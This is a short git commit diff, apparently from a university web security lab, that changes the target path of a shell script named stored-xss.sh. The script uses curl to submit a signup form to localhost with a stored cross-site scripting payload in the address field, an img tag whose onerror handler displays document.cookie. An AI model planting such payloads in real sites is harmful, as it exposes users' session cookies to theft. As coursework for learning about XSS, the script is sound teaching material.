845f4be75a03be2dcceab9b69bed12facd6784e3
Axel Smeets <dat12asm@student.lu.se>
2015-09-26 21:16:48 +0200

    update stored-xss.sh to use /websec/signup.php

--- stored-xss.sh
+++ stored-xss.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-curl -X POST localhost/signup.php \
+curl -X POST localhost/websec/signup.php \
 	-d "email=hejsan@curl" \
 	-d "name=curl4hax" \
 	-d "address=<img src=x onerror=\"alert('here are your cookies'); alert(document.cookie);\"\/>" \
